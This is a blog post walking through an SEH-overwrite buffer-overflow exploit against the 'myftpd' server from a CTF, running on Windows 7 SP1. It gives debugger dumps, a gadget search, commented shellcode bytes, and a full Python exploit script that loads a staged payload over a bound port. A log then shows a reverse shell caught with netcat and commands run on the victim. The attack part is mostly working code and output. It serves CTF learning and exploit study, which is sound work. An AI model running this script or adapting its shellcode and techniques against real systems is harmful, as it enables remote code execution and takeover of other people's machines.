---
categories:
- Security
- Exploits
- CTF
comments: true
date: 2014-03-12T19:48:47Z
title: myftpd Exploit on Windows 7
---

In my [previous post][] I covered off, in relative detail, how to exploit the IDSECCONF offline CTF `myftpd` server running on Windows XP. This exploit makes use of a Vanilla `EIP` overwrite along with some _shellcode golf_ to allow for execution of arbitrary payloads. At the time I had intended to write up a way of making this work on other versions of Windows, but that post ended up long enough so I decided to publish without the extra detail.

In this post I am going to show how you can make this exploit work on Windows 7 SP1. This doesn't really _bypass_ ASLR, it just avoids it.

If you haven't read the [previous post][], then please go and read that now. If you're ready, then let's dive in.

<!--more-->

To cut to the chase, using a vanilla EIP overwrite on Windows 7 isn't possible. The reason is because we don't have the ability to write an address to `EIP` which directs control back to `ESP`. Why? Because:

* Windows 7 has [ASLR][].
* All system DLLs are compiled with `/DYNAMICBASE`, and hence are ASLR-enabled. This means we can't rely on system DLLs for our addresses.
* Partial-overwrites of addresses are not possible due to the way the payload is written to memory.
* The only part of the application that has consistent addresses is the `myftpd.exe` binary itself, which means all the addresses have the form `0x0040____`. Notice the leading `NULL` byte. Even if we did have an address for a `JMP ESP` or `CALL ESP` instruction (which we don't), the truncation with the `NULL` byte results in so little space that exploitation is even harder.

So with this in mind, we needed a new approach. This is where we turn to [SEH overwrites][].

## The SEH Overwrite

If we overwrite `EIP` with an invalid value the SEH handler kicks in, and with our payload being long enough we are able to control the SEH pointers in the typical fashion. So we can start by writing out a rather boring payload that's really long and firing it off in the usual fashion at the `myftpd` binary running with Immunity attached. From here we can see that an **Access Violation** happens, and so if we hit `SHIFT+F9` at this point, we see the following register information:

```
EAX 00000000
ECX 41414141
EDX 77DEB4AD ntdll.77DEB4AD
EBX 00000000
ESP 021FC568
EBP 021FC588
ESI 00000000
EDI 00000000
EIP 41414141   <--- ooh!
```

And we also see the SEH chain looking something like this:

```
SEH chain of thread 000008B0
Address    SE handler
021FC57C   ntdll.77DEB4AD
021FFFC4   41414141              <--- juicy!
41414141   *** CORRUPT ENTRY ***
```

The next step is to do the usual `pattern_create.rb`/`pattern_offset.rb` dance to determine the offsets of the `SEH` and `NSEH` addresses. You all know how to do this by now, so I'll skip to it and show you:

```
$ pattern_offset.rb 41386c41
[*] Exact match at offset 354
```

So the SEH offset is `354`, which makes the NSEH offset `350`. Next we need an address that we can write to SEH, and this address needs to contain the usual chain of `POP # POP # RET` instructions which returns control to the NSEH location. Using Mona.py we find:

```
0BADF00D   [+] Results :
00403723     0x00403723 : pop ebx # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [myftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\OJ\Desktop\myftpd.exe)
00403A8A     0x00403a8a : pop esi # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [myftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\OJ\Desktop\myftpd.exe)
00403AF5     0x00403af5 : pop esi # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [myftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\OJ\Desktop\myftpd.exe)
00403B4F     0x00403b4f : pop esi # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [myftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\OJ\Desktop\myftpd.exe)
004011CB     0x004011cb : pop ebx # pop ebp # ret 0x04 | startnull {PAGE_EXECUTE_READ} [myftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\OJ\Desktop\myftpd.exe)
0BADF00D       Found a total of 5 pointers
```

To minimise potential bad character damage I went with `0x00403723`. This is the value that we need to write to the SEH location. In the 4 bytes before that we'll write 4 x `CC` bytes (breakpoints) so that we can validate that we've gained control. So our payload looks like:

```
seh_offset = 354
nseh_offset = seh_offset - 4
payload  = "A" * nseh_offset
payload += "\xCC" * 4
payload += struct.pack("<L", 0x00403723)
```

You'll notice I'm not giving as much away as I did in the previous post. I'll instead save it for the big reveal at the end.

If we run this we get an access violation, which again we hit `SHIFT+F9` to pass to the application and we see this in Immunity:

```
022CFFBC   41               INC ECX
022CFFBD   41               INC ECX
022CFFBE   41               INC ECX
022CFFBF   41               INC ECX
022CFFC0   41               INC ECX
022CFFC1   41               INC ECX
022CFFC2   41               INC ECX
022CFFC3   41               INC ECX
022CFFC4   CC               INT3                      <== EIP points here
022CFFC5   CC               INT3
022CFFC6   CC               INT3
022CFFC7   CC               INT3
022CFFC8   2337             AND ESI,DWORD PTR DS:[EDI]
022CFFCA   40               INC EAX
```

We have control. But this is where things start to change. It turns out that on Windows 7 the offset of our shellcode start is slightly different. The overwrite with zeros (as per the XP version) is still there, but appears in a different spot. We've got a few more bytes to play with around the shellcode area due to use not having to deal with `EIP` having a valid address in the middle of our shellcode. A quick calculation reveals that we have a total of `0x54` (`84`) bytes to play with. We can adjust our payload again to set up for more shellcode golf with the following code:

```
seh_offset = 354
nseh_offset = seh_offset - 4
sc_len = 0x54
sc_offset = nseh_offset - sc_len
payload  = "A" * sc_offset
payload += "\xCC" * 4
payload += "A" * (nseh_offset - len(payload))
payload += "\xEB\xAA\x90\x90"            # jmp back to sc_offset start
payload += struct.pack("<L", 0x00403723)
```

We fire this off again and we see this at the point where the PPR returns:

```
0231FFC1   41               INC ECX
0231FFC2   41               INC ECX
0231FFC3   41               INC ECX
0231FFC4  ^EB AA            JMP SHORT 0231FF70         <= EIP is here
0231FFC6   90               NOP
0231FFC7   90               NOP
0231FFC8   2337             AND ESI,DWORD PTR DS:[EDI]
```

At which point we then jump to the start of our shellcode here:

```
0231FF6C   0000             ADD BYTE PTR DS:[EAX],AL
0231FF6E   0000             ADD BYTE PTR DS:[EAX],AL
0231FF70   CC               INT3                       <= EIP is here
0231FF71   CC               INT3
0231FF72   CC               INT3
0231FF73   CC               INT3
0231FF74   41               INC ECX
0231FF75   41               INC ECX
0231FF76   41               INC ECX
0231FF77   41               INC ECX
```

We have control, and now we need to squeeze in our shellcode.

## Shellcode Golf

This time around I'm not going to go through things step by step like I did last time. Instead I'm going to keep it brief and highlight the key changes. Bear in mind that I wanted the shellcode to behave the same as the XP version in that it'd create a new socket to listen on and read the payload into memory. In order to do this I needed to save a number of bytes to get it to fit because the existing payload was too big.

### Saving 1 - JMP removal

First of all, I didn't have to deal with jumps like in the XP version so I could rejig the payload to be generated in order without those jmp shenanigans taking up valuable space. The first version looked like this:

```
shellcode  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
shellcode += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
shellcode += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
shellcode += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
shellcode += "\xB0\x06"                           # MOV AL, 0x6
shellcode += "\x50"                               # PUSH EAX
shellcode += "\xB0\x01"                           # MOV AL, 0x1
shellcode += "\x50"                               # PUSH EAX
shellcode += "\x40"                               # INC EAX
shellcode += "\x50"                               # PUSH EAX
# invoke the call to `socket`
shellcode += "\xFF\xD3"                           # CALL EBX
# save our socket handle
shellcode += "\x89\xC7"                           # MOV EDI, EAX
# Find sockaddr
shellcode += "\x89\xD9"                           # MOV ECX, EBX
shellcode += "\xB5\x74"                           # MOV CH, 0x74
# adjust the port number by bumping it up one to 22
shellcode += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
# adjust the call pointer to reference `bind`
shellcode += "\xB3\x54"                           # MOV BL, 0x54
# prepare the parameters on the stack for the `bind` call
shellcode += "\x6A\x10"                           # PUSH 0x10
shellcode += "\x51"                               # PUSH ECX
shellcode += "\x50"                               # PUSH EAX
# invoke the call to `bind`
shellcode += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `listen`
shellcode += "\xB3\x5C"                           # MOV BL, 0x5C
# prepare the parameters on the stack for the `listen` call
shellcode += "\x6A\x7F"                           # PUSH 0x7F
shellcode += "\x57"                               # PUSH EDI
# invoke the call to `listen`
shellcode += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `accept`
shellcode += "\xB3\x24"                           # MOV BL, 0x24
# prepare the parameters on the stack for the `accept` call
shellcode += "\x57"                               # PUSH EDI
# invoke the call to `accept`
shellcode += "\xFF\xD3"                           # CALL EBX
# prepare for the malloc call and call it
shellcode += "\x8B\xF8"                           # MOV EDI, EAX
shellcode += "\x66\xBB\xD4\x3D"                   # MOV BX, 0x3DD4
shellcode += "\x8A\xE0"                           # MOV AH, AL
shellcode += "\x50"                               # PUSH EAX
# invoke the call to `malloc`
shellcode += "\xFF\xD3"                           # CALL EBX
shellcode += "\x59\x51"                           # POP ECX, PUSH ECX
# save the memory handle, and push it up ready for later use
shellcode += "\x8B\xF0"                           # MOV ESI, EAX
shellcode += "\x50"                               # PUSH EAX
# set up virtual protect call
shellcode += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
shellcode += "\x8D\x44\x24\xDC"                   # LEA EAX, [ESP-0x24]
shellcode += "\x50"                               # PUSH EAX
shellcode += "\x6A\x40"                           # PUSH 0x40
shellcode += "\x51"                               # PUSH ECX
shellcode += "\x56"                               # PUSH ESI
# call virtual protect
shellcode += "\xFF\xD3"                           # CALL EBX
# prep the call for recv
shellcode += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
shellcode += "\x57"                               # PUSH EDI
shellcode += "\xFF\x13"                           # CALL [EBX]
# invoke the payload
shellcode += "\xFF\xE6"                           # JMP ESI
```

### Saving 2 - Initial address fudging

I didn't realise at first with the previous exploit, but at the time of the crash `ECX` actually contained a partially valid address from which we could start doing address calculations from. Our current method looks like this:

```
# Get the address of `socket` into EBX
shellcode += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
shellcode += "\xC1\xEB\x08"                       # SHR EBX, 0x8
```

Given that the higher-order bytes in `ECX` were usable, I adjusted this bit so that it was a little smarter:

```
# Get the address of `socket` into EBX
shellcode += "\x8B\xD9"                           # MOV EBX,ECX <contains an address>
shellcode += "\xB3\x34"                           # MOV BL, 0x34
shellcode += "\x8A\xFB"                           # MOV BH, BL  <address now valid>
```

We're down to `6` bytes from `8`. `2` bytes saved!

### Saving 3 - Pushing byte values

Again, in my n00bness, I was trying to be too smart with jiggling `EAX` values to push things onto to the stack prior to the call to `socket()`:

```
# set up the stack for the call to `socket`
shellcode += "\xB0\x06"                           # MOV AL, 0x6
shellcode += "\x50"                               # PUSH EAX
shellcode += "\xB0\x01"                           # MOV AL, 0x1
shellcode += "\x50"                               # PUSH EAX
shellcode += "\x40"                               # INC EAX
shellcode += "\x50"                               # PUSH EAX
```

I came to realise that pushing byte values to the stack was actually really small and didn't use any bad chars. Hence I changed things up to look like this:

```
# set up the stack for the call to `socket`
shellcode += "\x6A\x06"                           # PUSH 6
shellcode += "\x6A\x01"                           # PUSH 1
shellcode += "\x6A\x02"                           # PUSH 2
```

Again down from `8` bytes to `6`, giving us another `2` bytes in the pocket.

### Saving 4 - VirtualProtect params

The call to `VirtualProtect` requires a parameter that is a valid point which will receive the previous memory protection on return. Previously I was offsetting from `ESP` to make sure that the address was valid and writable. It looked like this:

```
# set up virtual protect call
shellcode += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
shellcode += "\x8D\x44\x24\xDC"                   # LEA EAX, [ESP-0x24]
shellcode += "\x50"                               # PUSH EAX
```

I have since realised that the `EBP` register actually falls within a valid memory area for just this purpose, so instead of doing an offset calculation and then a push, I just pushed `EBP` instead:

```
# set up virtual protect call
shellcode += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
shellcode += "\x55"                               # PUSH EBP
```

This cut another `4` bytes off the payload. W00t!

## The Final Exploit

The changes made to the shellcode resulted in a total of `8` bytes shaved off, which combined with the jump reshuffle made the payload fit into memory with room to spare! Happy with that. Before I reveal the final exploit I'd like to mention a couple of things:

* This approach didn't work on Windows XP, and hence the old exploit which works on XP I had to keep around.
* This approach still _does not work_ with Vista. The shellcode space on Vista is even smaller and I have yet to put the effort in to find another approach which fits within the memory constraints.
* It also doesn't work on Windows 8, but I haven't attached a debugger to it to figure out why just yet.

At this point I think I'll move onto another challenge (perhaps something more real world?). And so without further delay, here it is:

```
#!/usr/bin/python

import socket, struct, time, sys

def windows_7(target):
  seh_offset = 354
  nseh_offset = seh_offset - 4
  sc_len = 0x54
  sc_offset = nseh_offset - sc_len

  ppr = struct.pack("<L", target['PPR'])

  shellcode  = ""
  # Adjust the stack to prevent it from breaking things in our shellcode
  shellcode += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
  # Get the address of `socket` into EBX
  shellcode += "\x8B\xD9"                           # MOV EBX,ECX <contains an address>
  shellcode += "\xB3\x34"                           # MOV BL, 0x34
  shellcode += "\x8A\xFB"                           # MOV BH, BL  <address now valid>
  # set up the stack for the call to `socket`
  shellcode += "\x6A\x06"                           # PUSH 6
  shellcode += "\x6A\x01"                           # PUSH 1
  shellcode += "\x6A\x02"                           # PUSH 2
  # invoke the call to `socket`
  shellcode += "\xFF\xD3"                           # CALL EBX
  # save our socket handle
  shellcode += "\x89\xC7"                           # MOV EDI, EAX
  # Find sockaddr
  shellcode += "\x89\xD9"                           # MOV ECX, EBX
  shellcode += "\xB5\x74"                           # MOV CH, 0x74
  # adjust the port number by bumping it up one to 22
  shellcode += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
  # adjust the call pointer to reference `bind`
  shellcode += "\xB3\x54"                           # MOV BL, 0x54
  # prepare the parameters on the stack for the `bind` call
  shellcode += "\x6A\x10"                           # PUSH 0x10
  shellcode += "\x51"                               # PUSH ECX
  shellcode += "\x50"                               # PUSH EAX
  # invoke the call to `bind`
  shellcode += "\xFF\xD3"                           # CALL EBX
  # adjust the call pointer to reference `listen`
  shellcode += "\xB3\x5C"                           # MOV BL, 0x5C
  # prepare the parameters on the stack for the `listen` call
  shellcode += "\x6A\x7F"                           # PUSH 0x7F
  shellcode += "\x57"                               # PUSH EDI
  # invoke the call to `listen`
  shellcode += "\xFF\xD3"                           # CALL EBX
  # adjust the call pointer to reference `accept`
  shellcode += "\xB3\x24"                           # MOV BL, 0x24
  # prepare the parameters on the stack for the `accept` call
  shellcode += "\x57"                               # PUSH EDI
  # invoke the call to `accept`
  shellcode += "\xFF\xD3"                           # CALL EBX
  # prepare for the malloc call and call it
  shellcode += "\x8B\xF8"                           # MOV EDI, EAX
  shellcode += "\x66\xBB\xD4\x3D"                   # MOV BX, 0x3DD4
  shellcode += "\x8A\xE0"                           # MOV AH, AL
  shellcode += "\x50"                               # PUSH EAX
  # invoke the call to `malloc`
  shellcode += "\xFF\xD3"                           # CALL EBX
  shellcode += "\x59\x51"                           # POP ECX, PUSH ECX
  # save the memory handle, and push it up ready for later use
  shellcode += "\x8B\xF0"                           # MOV ESI, EAX
  shellcode += "\x50"                               # PUSH EAX
  # set up virtual protect call
  shellcode += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
  shellcode += "\x55"                               # PUSH EBP
  shellcode += "\x6A\x40"                           # PUSH 0x40
  shellcode += "\x51"                               # PUSH ECX
  shellcode += "\x56"                               # PUSH ESI
  # call virtual protect
  shellcode += "\xFF\xD3"                           # CALL EBX
  # prep the call for recv
  shellcode += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
  shellcode += "\x57"                               # PUSH EDI
  # call recv
  shellcode += "\xFF\x13"                           # CALL [EBX]
  # invoke the payload
  shellcode += "\xFF\xE6"                           # JMP ESI

  command  = ""
  command += "Z" * sc_offset
  command += shellcode[0:sc_len]
  command += "B" * (nseh_offset - len(command))
  command += "\xEB\xAA\x90\x90" # jmp back to sc_offset start
  command += ppr
  command += "E" * 100

  return command

def windows_xp(target):
  max_size = 365

  offsets = {
    'SC': 266,
    'EIP': 294,
    'ESP': 302,
  }

  block1  = ""
  # Adjust the stack to prevent it from breaking things in our shellcode
  block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
  # Get the address of `socket` into EBX
  block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
  block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
  # set up the stack for the call to `socket`
  block1 += "\xB0\x06"                           # MOV AL, 0x6
  block1 += "\x50"                               # PUSH EAX
  block1 += "\xB0\x01"                           # MOV AL, 0x1
  block1 += "\x50"                               # PUSH EAX
  block1 += "\x40"                               # INC EAX
  block1 += "\x50"                               # PUSH EAX
  # invoke the call to `socket`
  block1 += "\xFF\xD3"                           # CALL EBX
  # save our socket handle
  block1 += "\x89\xC7"                           # MOV EDI, EAX
  # Find sockaddr
  block1 += "\x89\xD9"                           # MOV ECX, EBX
  block1 += "\xB5\x74"                           # MOV CH, 0x74
  # adjust the port number by bumping it up one to 22
  block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
  # adjust the call pointer to reference `bind`
  block1 += "\xB3\x54"                           # MOV BL, 0x54
  # prepare the parameters on the stack for the `bind` call
  block1 += "\x6A\x10"                           # PUSH 0x10
  block1 += "\x51"                               # PUSH ECX
  block1 += "\x50"                               # PUSH EAX
  # invoke the call to `bind`
  block1 += "\xFF\xD3"                           # CALL EBX
  # adjust the call pointer to reference `listen`
  block1 += "\xB3\x5C"                           # MOV BL, 0x5C
  # prepare the parameters on the stack for the `listen` call
  block1 += "\x6A\x7F"                           # PUSH 0x7F
  block1 += "\x57"                               # PUSH EDI
  # invoke the call to `listen`
  block1 += "\xFF\xD3"                           # CALL EBX
  # adjust the call pointer to reference `accept`
  block1 += "\xB3\x24"                           # MOV BL, 0x24
  # prepare the parameters on the stack for the `accept` call
  block1 += "\x57"                               # PUSH EDI
  # invoke the call to `accept`
  block1 += "\xFF\xD3"                           # CALL EBX
  # prepare for the malloc call and call it
  block1 += "\x8B\xF8"                           # MOV EDI, EAX
  block1 += "\x66\xBB\xD4\x3D"                   # MOV BX, 0x3DD4
  block1 += "\x8A\xE0"                           # MOV AH, AL
  block1 += "\x50"                               # PUSH EAX
  # invoke the call to `malloc`
  block1 += "\xFF\xD3"                           # CALL EBX
  block1 += "\xEB\x9D"                           # JMP BLOCK2

  block2  = ""
  block2 += "\x59\x51"                           # POP ECX, PUSH ECX
  # save the memory handle, and push it up ready for later use
  block2 += "\x8B\xF0"                           # MOV ESI, EAX
  block2 += "\x50"                               # PUSH EAX
  # set up virtual protect call
  block2 += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
  block2 += "\x8D\x44\x24\xDC"                   # LEA EAX, [ESP-0x24]
  block2 += "\x50"                               # PUSH EAX
  block2 += "\x6A\x40"                           # PUSH 0x40
  block2 += "\x51"                               # PUSH ECX
  block2 += "\x56"                               # PUSH ESI
  # call virtual protect
  block2 += "\xFF\xD3"                           # CALL EBX
  # prep the call for recv
  block2 += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
  block2 += "\x57"                               # PUSH EDI
  # jump to tucked block
  block2 += "\xEB\x05"                           # JMP <5 bytes forward>

  tucked  = ""
  # call recv
  tucked += "\xFF\x13"                           # CALL [EBX]
  # invoke the payload
  tucked += "\xFF\xE6"                           # JMP ESI

  command  = ""
  command += "Z" * (offsets['SC'] - len(command))
  command += block2
  command += "B" * (offsets['EIP'] - len(command))
  command += struct.pack("<L", target['JMPESP'])
  command += tucked
  command += block1
  command += "E" * (max_size - len(command))
  return command

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload, port, recv = True):
  print "[*] Sending {0} bytes to {1}:{2}...".format(len(payload), host, port)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  if recv:
    s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

# the start of our collection of supported platforms
targets = [
    { 'Name': 'Windows XP SP3', 'Func': windows_xp, 'JMPESP': 0x7e4456f7 },
    { 'Name': 'Windows 7', 'Func': windows_7, 'PPR': 0x00403723 }
]

if len(sys.argv) != 5:
  print "Usage: {0} <target> <host> <port> <payload>".format(sys.argv[0])
  print "   Targets:"
  for i in range(0, len(targets)):
    print "     {0}: {1}".format(i, targets[i]['Name'])
  print "Eg. {0} 0 127.0.0.1 21 revshell.bin".format(sys.argv[0])
  sys.exit(1)

target = targets[int(sys.argv[1])]
host = sys.argv[2]
port = int(sys.argv[3])
payload_file = sys.argv[4]

print "[*] Attacking {0} at {1}:{2} ...".format(target['Name'], host, port)
command = target['Func'](target)

# send the initial exploit
pwn(command, port)
# wait a sec for the port to be bound
time.sleep(1)
# Send the payload on the bind port
pwn(read_file(payload_file), port + 1, False)

```

Execution looks like this:

```
$ ./myftpd.py                                 
Usage: ./myftpd.py <target> <host> <port> <payload>
   Targets:
     0: Windows XP SP3
     1: Windows 7
Eg. ./myftpd.py 0 127.0.0.1 21 revshell.bin
$ ./myftpd.py 1 10.1.10.32 21 revshell4444.bin
[*] Attacking Windows 7 at 10.1.10.32:21 ...
[*] Sending 458 bytes to 10.1.10.32:21...
[*] Sending 341 bytes to 10.1.10.32:22...
```

And the listener results in this:

```
$ nc -lvp 4444
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.1.10.32.
Ncat: Connection from 10.1.10.32:50572.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\OJ\Desktop>systeminfo
systeminfo

Host Name:                 WIN-S45GUQ5KGVK
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
... snip ...
```

I hope you find it useful! Cheers!

  [previous post]: /posts/idsecconf-2013-myftpd-challenge/
  [SEH overwrites]: https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
  [ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization

